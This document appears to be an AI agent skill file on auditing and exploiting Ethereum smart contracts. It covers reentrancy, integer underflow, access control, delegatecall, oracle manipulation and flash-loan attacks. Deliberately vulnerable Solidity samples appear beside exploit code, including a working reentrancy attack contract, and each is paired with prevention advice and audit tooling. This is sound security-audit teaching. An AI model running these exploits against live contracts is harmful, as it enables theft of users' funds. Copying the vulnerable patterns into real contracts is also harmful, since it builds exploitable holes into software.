---
name: exploiting-web3-smart-contracts
description: Audit and exploit smart contracts and Web3 applications including reentrancy, integer overflow, access control flaws, and DeFi-specific vulnerabilities. Use when testing blockchain applications or performing smart contract audits.
---

# Exploiting Web3 and Smart Contracts

## When to Use

- Smart contract security auditing
- DeFi protocol testing
- Web3 application pentesting
- Blockchain vulnerability assessment
- NFT platform security

## Environment Setup

**Install Tools:**
```bash
# Node.js and npm
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Hardhat (Ethereum development)
npm install --save-dev hardhat

# Foundry (Rust-based toolkit)
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Slither (static analysis)
pip3 install slither-analyzer

# Mythril (security analysis)
pip3 install mythril
```

**Connect to Networks:**
```javascript
// Ethereum Mainnet via Infura
const Web3 = require('web3');
const web3 = new Web3('https://mainnet.infura.io/v3/YOUR_KEY');

// Local development (Hardhat/Ganache)
const web3 = new Web3('http://127.0.0.1:8545');
```

## Common Smart Contract Vulnerabilities

### 1. Reentrancy

**Vulnerable Contract:**
```solidity
contract Vulnerable {
    mapping(address => uint) public balances;

    function withdraw() public {
        uint amount = balances[msg.sender];
        // Vulnerable: external call before state update
        (bool success,) = msg.sender.call{value: amount}("");
        require(success);
        balances[msg.sender] = 0;  // State update after call
    }
}
```

**Exploit:**
```solidity
contract Attack {
    Vulnerable victim;

    constructor(address _victim) {
        victim = Vulnerable(_victim);
    }

    function attack() public payable {
        victim.deposit{value: 1 ether}();
        victim.withdraw();
    }

    fallback() external payable {
        if (address(victim).balance >= 1 ether) {
            victim.withdraw();  // Reenter
        }
    }
}
```

**Prevention:**
- Checks-Effects-Interactions pattern
- ReentrancyGuard modifier
- Use transfer() instead of call()

### 2. Integer Overflow/Underflow

**Vulnerable (Solidity < 0.8.0):**
```solidity
function transfer(address _to, uint256 _value) public {
    require(balances[msg.sender] - _value >= 0);  // Can underflow
    balances[msg.sender] -= _value;
    balances[_to] += _value;  // Can overflow
}
```

**Exploit:**
```solidity
// Send more tokens than you have
// balances[msg.sender] = 1
// _value = 2
// 1 - 2 = 2^256 - 1 (underflow)
```

**Prevention:**
- Use Solidity >= 0.8.0 (automatic checks)
- Use SafeMath library
- Manual overflow checks

### 3. Access Control Issues

**Vulnerable:**
```solidity
function withdraw() public {
    // Missing access control!
    msg.sender.transfer(address(this).balance);
}

function setOwner(address _owner) public {
    owner = _owner;  // Anyone can become owner
}
```

**Exploit:**
```javascript
// Call withdraw from any address
await contract.withdraw();

// Become owner
await contract.setOwner(attackerAddress);
```

**Prevention:**
```solidity
modifier onlyOwner() {
    require(msg.sender == owner, "Not owner");
    _;
}

function withdraw() public onlyOwner {
    msg.sender.transfer(address(this).balance);
}
```

### 4. Unchecked External Calls

**Vulnerable:**
```solidity
function callExternal(address target) public {
    target.call("");  // Return value not checked
}

function sendEther(address payable recipient) public {
    recipient.send(1 ether);  // Silently fails if send() returns false
}
```

**Prevention:**
```solidity
(bool success,) = target.call("");
require(success, "Call failed");
```

### 5. Delegatecall Injection

**Vulnerable:**
```solidity
function forward(address _target, bytes memory _data) public {
    _target.delegatecall(_data);  // Executes in contract's context
}
```

**Exploit:**
```solidity
// Attacker can modify contract storage
// Call selfdestruct()
// Change owner
```

**Prevention:**
- Avoid delegatecall to user-controlled addresses
- Whitelist allowed targets
- Use libraries instead

### 6. Front-Running / MEV

**Scenario:**
```solidity
// DEX swap at specific price
function swap(uint256 amountIn) public {
    uint256 amountOut = getAmountOut(amountIn);
    // Attacker sees this in mempool
    // Submits transaction with higher gas to execute first
    // Changes the price before victim's tx
}
```

**MEV Attacks:**
- Front-running
- Back-running
- Sandwich attacks
- Liquidations
- Arbitrage

**Mitigation:**
- Commit-reveal schemes
- Private mempools (Flashbots)
- Slippage protection
- Minimal on-chain disclosure

### 7. Price Oracle Manipulation

**Vulnerable:**
```solidity
// Using single DEX as price source
function getPrice() public view returns (uint256) {
    return uniswapPair.getReserves();
}
```

**Exploit:**
```solidity
// Flash loan attack
// 1. Borrow large amount
// 2. Manipulate DEX price
// 3. Interact with vulnerable contract
// 4. Repay flash loan
// 5. Profit
```

**Prevention:**
- Use time-weighted average price (TWAP)
- Multiple oracle sources (Chainlink)
- Delay price updates
- Min/max price bounds

### 8. Denial of Service

**Vulnerable:**
```solidity
function distribute() public {
    for (uint i = 0; i < users.length; i++) {
        users[i].transfer(amount);  // Can run out of gas
    }
}

function withdraw() public {
    // Winner takes all
    require(msg.sender == topBidder);
    msg.sender.transfer(address(this).balance);
}
```

**Exploit:**
- Create contract that rejects ether (reverts in fallback)
- Become topBidder
- Prevent anyone from winning

**Prevention:**
- Pull over push pattern
- Gas limits
- Emergency stop mechanisms

## Auditing Tools

### Static Analysis

**Slither:**
```bash
# Analyze contract
slither contract.sol

# Specific detectors
slither contract.sol --detect reentrancy-eth,tx-origin

# Generate report
slither contract.sol --json output.json

# Common detectors:
# - reentrancy-eth
# - uninitialized-state
# - tx-origin
# - unchecked-transfer
# - arbitrary-send
```

**Mythril:**
```bash
# Analyze with Mythril
myth analyze contract.sol

# Specify contract
myth analyze contract.sol:ContractName

# Graph generation
myth analyze contract.sol --graph output.html
```

**Securify:**
```bash
# Online tool
# https://securify.chainsecurity.com/
```

### Dynamic Analysis

**Echidna (Fuzzer):**
```bash
# Install
docker pull trailofbits/echidna

# Run fuzzer
echidna-test contract.sol --contract ContractName
```

**Manticore (Symbolic Execution):**
```bash
# Install
pip3 install manticore

# Analyze
manticore contract.sol
```

### Testing Frameworks

**Hardhat:**
```javascript
const { expect } = require("chai");

describe("Token", function () {
  it("Should exploit reentrancy", async function () {
    const [owner, attacker] = await ethers.getSigners();

    const Vulnerable = await ethers.getContractFactory("Vulnerable");
    const vulnerable = await Vulnerable.deploy();

    const Attack = await ethers.getContractFactory("Attack");
    const attack = await Attack.deploy(vulnerable.address);

    // Exploit
    await attack.attack({ value: ethers.utils.parseEther("1.0") });

    // Verify
    expect(await ethers.provider.getBalance(vulnerable.address)).to.equal(0);
  });
});
```

**Foundry:**
```solidity
// test/Exploit.t.sol
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract ExploitTest is Test {
    Vulnerable public vulnerable;

    function setUp() public {
        vulnerable = new Vulnerable();
    }

    function testExploit() public {
        // Test exploit
    }
}
```

```bash
# Run tests
forge test
forge test --match-contract ExploitTest -vvv
```

## DeFi-Specific Attacks

### Flash Loan Attack

```solidity
interface IFlashLoan {
    function flashLoan(uint256 amount) external;
}

contract FlashLoanExploit {
    function exploit() external {
        // 1. Borrow flash loan
        IFlashLoan(lender).flashLoan(1000000 ether);
    }

    function executeOperation(uint256 amount) external {
        // 2. Manipulate price oracle
        // 3. Exploit vulnerable contract
        // 4. Repay flash loan + fee
        // 5. Keep profit
    }
}
```

### Impermanent Loss Exploitation

- Manipulate pool ratios
- Extract value from liquidity providers
- Arbitrage price differences

### Governance Attacks

```solidity
// Flash loan to get voting power
// Vote on malicious proposal
// Execute immediately
// Repay loan
```

## Web3 Frontend Vulnerabilities

**Wallet Connection:**
```javascript
// Vulnerable: No signature verification
const signature = await signer.signMessage(message);
// Attacker can replay signature

// Secure: Include nonce and timestamp
const message = `Nonce: ${nonce}\nTimestamp: ${timestamp}`;
```

**Transaction Simulation:**
```javascript
// Before sending transaction
const result = await contract.callStatic.functionName(args);
// Verify expected outcome
```

## Blockchain Forensics

**Etherscan API:**
```bash
# Get contract source
curl "https://api.etherscan.io/api?module=contract&action=getsourcecode&address=0x..."

# Get transactions
curl "https://api.etherscan.io/api?module=account&action=txlist&address=0x..."
```

**Transaction Analysis:**
```javascript
// Get transaction
const tx = await web3.eth.getTransaction(txHash);

// Get receipt
const receipt = await web3.eth.getTransactionReceipt(txHash);

// Decode input data
const decoded = contract.interface.parseTransaction({ data: tx.input });
```

**Event Monitoring:**
```javascript
// Listen for events
contract.on("Transfer", (from, to, amount) => {
    console.log(`Transfer: ${from} -> ${to}: ${amount}`);
});

// Past events
const events = await contract.queryFilter("Transfer", fromBlock, toBlock);
```

## NFT-Specific Vulnerabilities

**Metadata Manipulation:**
- Centralized metadata storage
- Mutable tokenURI
- IPFS pinning issues

**Minting Exploits:**
```solidity
// Reentrancy in minting
function mint() external payable {
    require(msg.value == price);
    (bool success,) = owner.call{value: msg.value}("");  // Vulnerable
    _mint(msg.sender, tokenId++);
}
```

**Royalty Bypass:**
- Direct NFT transfers
- Bypassing marketplace fees
- Washing trades

## Testing on Mainnet Fork

**Hardhat:**
```javascript
// hardhat.config.js
module.exports = {
  networks: {
    hardhat: {
      forking: {
        url: "https://eth-mainnet.alchemyapi.io/v2/YOUR_KEY",
        blockNumber: 14000000
      }
    }
  }
};
```

**Foundry:**
```bash
# Fork mainnet
forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/YOUR_KEY

# Specific block
forge test --fork-url https://... --fork-block-number 14000000
```

## Tools Summary

**Analysis:**
- Slither - Static analyzer
- Mythril - Security scanner
- Manticore - Symbolic execution
- Echidna - Fuzzer

**Development:**
- Hardhat - Development environment
- Foundry - Rust-based toolkit
- Remix - Online IDE
- Truffle - Development framework

**Monitoring:**
- Etherscan - Block explorer
- Tenderly - Debugging platform
- OpenZeppelin Defender - Security monitoring

## Security Best Practices

1. **Use latest Solidity** (>= 0.8.0)
2. **Follow** Checks-Effects-Interactions pattern
3. **Limit** external calls
4. **Validate** all inputs
5. **Use** established libraries (OpenZeppelin)
6. **Implement** access control
7. **Add** emergency pause
8. **Get** professional audits
9. **Use** testnets extensively
10. **Monitor** contracts post-deployment

## References

- https://book.hacktricks.xyz/blockchain
- https://consensys.github.io/smart-contract-best-practices/
- https://github.com/crytic/building-secure-contracts
- https://github.com/OpenZeppelin/openzeppelin-contracts
- https://ethernaut.openzeppelin.com/ (CTF)
